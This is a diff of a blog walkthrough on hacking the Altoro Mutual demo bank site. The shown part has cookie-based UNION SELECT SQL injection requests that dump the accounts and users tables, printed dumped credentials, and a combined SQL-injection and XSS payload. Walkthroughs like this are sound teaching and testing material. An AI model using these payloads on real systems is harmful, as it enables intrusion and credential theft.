-<p><a href="http://static.dornea.nu/img/2013/b1026f72d91a1a47e093af15e154b71d.png" title="attachment:main_sql_injection.png"><img alt="SQL Injection" class="img-responsive" height="580" src="http://static.dornea.nu/img/2013/b1026f72d91a1a47e093af15e154b71d.png" title="attachment:main_sql_injection.png" width="NaN"/></a></p>
-<p>Ahhh, there we go!Â <strong>Another SQL injection vulnerability!</strong>Â You could now dump some data:</p>
-<p> </p>
-<pre>#!highlight html 
-GET /bank/main.aspx HTTP/1.1
+System.Data.OleDb.OleDbException: Syntax error in string in query expression 'userid = 1''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Default.GetAccounts(String userId) in d:downloadsAltoroMutual_v6websitankmain.aspx.cs:line 54 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitankmain.aspx.cs:line 31 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+</pre></div>
+<p>Ahhh, there we go! <strong>Another SQL injection vulnerability!</strong> You could now dump some data:</p>
+<div class="highlight"><pre>GET /bank/main.aspx HTTP/1.1
 Host: demo.testfire.net
 ...
-amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=2 union select accountid, acct_type from accounts;--
-</pre>
-<p><a href="http://static.dornea.nu/img/2013/89e21aed3343e3512a8eb6267ea8b7bf.png" title="attachment:main_sql_injection2.png"><img alt="SQL Injection" class="img-responsive" height="578" src="http://static.dornea.nu/img/2013/89e21aed3343e3512a8eb6267ea8b7bf.png" title="attachment:main_sql_injection2.png" width="NaN"/></a></p>
-<p>You could use this vulnerability toÂ <strong>dump theÂ <em>users</em>Â table</strong>:</p>
-<pre>GET /bank/main.aspx HTTP/1.1
+amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=2 union select accountid, acct_type from accounts;--
+</pre></div>
+<p>You could use this vulnerability to <strong>dump the <em>users</em> table</strong>:</p>
+<div class="highlight"><pre>GET /bank/main.aspx HTTP/1.1
 Host: demo.testfire.net
 ...
-amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=2 union select username, password from users;--
-</pre>
+amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=2 union select username, password from users;--
+</pre></div>
 <p>This will return:</p>
-<pre>admin admin
+<div class="highlight"><pre>admin admin
 cclay Ali
 jsmith Demo1234
 sjoe frazier
 sspeed Demo1234
 tuser tuser
-</pre>
-<p>Simple, isn’t it? <img alt=":-D" class="wp-smiley img-responsive" src="http://dornea.nu/wp-includes/images/smilies/icon_biggrin.gif"/> </p>
-<p> </p>
-<h3 id="126fccae2356602cff581a01152f34e7"><span id="XSS_using_cookie_data">XSS using cookie data</span></h3>
+</pre></div>
+<p>Simple, isn't it?</p>
+<h3 id="126fccae2356602cff581a01152f34e7">XSS using cookie data</h3>
 <p>Alternatively you could combine SQLi with XSS:</p>
-<pre>#!highlight html 
-GET /bank/main.aspx HTTP/1.1
+<div class="highlight"><pre>GET /bank/main.aspx HTTP/1.1
 Host: demo.testfire.net
 ...
-amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=2 union select "&lt;script&gt;alert(1234)&lt;/script&gt;", "Injection FOUND!" from accounts;--
-</pre>
-<p><a href="http://static.dornea.nu/img/2013/fe65a05f2bc5e5ec889f64f81e9f007e.png" title="attachment:main_sql_injection_with_xss.png"><img alt="SQL Injection" class="img-responsive" height="581" src="http://static.dornea.nu/img/2013/fe65a05f2bc5e5ec889f64f81e9f007e.png" title="attachment:main_sql_injection_with_xss.png" width="NaN"/></a></p>
+amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=2 union select "<span class="nt">&lt;script&gt;</span><span class="p">...</span><span class="nt">&lt;/script&gt;</span>", "Injection FOUND!" from accounts;--
+</pre></div>
                 </div>
 <hr/>
 <div style="float:left;">
-	Prev: <a href="http://blog.dornea.nu/2013/05/02/overthewire-vortex-level1" align='left'>
+	Prev: <a href="http://blog.dornea.nu/2013/05/03/overthewire-vortex-level1" align='left'>
 	 OverTheWire: Vortex Level1
 	</a>
 </div>
 <div style="float:right;">
-    Next: <a href="http://blog.dornea.nu/2013/05/17/introducing-links-of-the-week-low-1" align='right'>
-	 Introducing Links of the Week (LOW) #1
+    Next: <a href="http://blog.dornea.nu/2013/06/26/dinge-die-ein-informatikerstudent-niemals-sagen-wurde" align='right'>
+	 Dinge, die ein Informatikerstudent niemals sagen würde
 	</a>
 </div>
 </p>
@@ -682,10 +607,11 @@ amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=2 union select "&l
                     <div class="niu2-sidebar-value"><a href="http://blog.dornea.nu/category/blog">blog</a></div>
                     <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/hacking/">hacking</a><sup>20</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/security/">security</a><sup>29</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/security/">security</a><sup>33</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>7</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/web/">web</a><sup>13</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/appsec/">appsec</a><sup>15</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/web/">web</a><sup>14</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/appsec/">appsec</a><sup>22</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/xss/">xss</a><sup>5</sup></div>
                 </div>
 
                 <div id="niu2-sidebar-toc" class="niu2-sidebar" data-status="closed">
@@ -694,7 +620,7 @@ amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=2 union select "&l
                     </div>
                     <ul id="niu2-sidebar-toc-list">
                         <li><a href="#content-heading">Hacking Altoro Mutual</a></li>
-                        <li><a href='#3d259698b7b1fa955b8b4bfd78c184d3'>IntroductionÂ </a></li><li><a href='#5aa530919b62444243ee30a0ef52aee1'>Vulnerabilities by URL</a><ul><li><a href='#765f6e48248fbc7c4d9648b544f5e5c6'>/default.aspx?content=</a></li><li><a href='#0b6275b4fd4340d418195012eb027c55'>/bank</a></li><li><a href='#65497bf7a464b98772b9026e8870b752'>/bank/login.aspx</a><ul><li><a href='#c6c7fb86f055418b430d443a7f425228'>Brute force vulnerability</a></li><li><a href='#1893267eeefa97c21a09c4e6d7d15585'>SQL injection using POST parameters</a></li><li><a href='#67cf80dbb18aadf77119f4a4f5cb98ab'>Base64-encoded login credentials</a></li></ul></li><li><a href='#3b289266841a38499874d73cf76dea4c'>/bank/main.aspxÂ </a><ul><li><a href='#7dfe4e77b9ff513418fef8297c5f792a'>Source code disclosure</a></li><li><a href='#7b966d041c9c404fa4d83013a8280060'>SQL injection using Cookie data</a></li><li><a href='#126fccae2356602cff581a01152f34e7'>XSS using cookie data</a></li></ul></li></ul></li>
+                        <li><a href='#0b79795d3efc95b9976c7c5b933afce2'>Introduction</a></li><li><a href='#535e2de9168013bbfc31965016086243'>Vulnerabilities</a><ul><li><a href='#765f6e48248fbc7c4d9648b544f5e5c6'>/default.aspx?content=</a></li></ul></li><li><a href='#0b6275b4fd4340d418195012eb027c55'>/bank</a></li><li><a href='#65497bf7a464b98772b9026e8870b752'>/bank/login.aspx</a><ul><li><a href='#c6c7fb86f055418b430d443a7f425228'>Brute force vulnerability</a></li><li><a href='#1893267eeefa97c21a09c4e6d7d15585'>SQL injection using POST parameters</a></li><li><a href='#67cf80dbb18aadf77119f4a4f5cb98ab'>Base64-encoded login credentials</a></li></ul></li><li><a href='#b972e994dc14d79d46fa4e6b52f434a8'>/bank/main.aspx</a><ul><li><a href='#a2d31302f3ea6529e388f323038bd524'>Source code disclosure<</a></li><li><a href='#7b966d041c9c404fa4d83013a8280060'>SQL injection using Cookie data</a></li><li><a href='#126fccae2356602cff581a01152f34e7'>XSS using cookie data</a></li></ul></li>
                         <li><a href="#content-comments">Comments</a></li>
                     </ul>
                 </div>
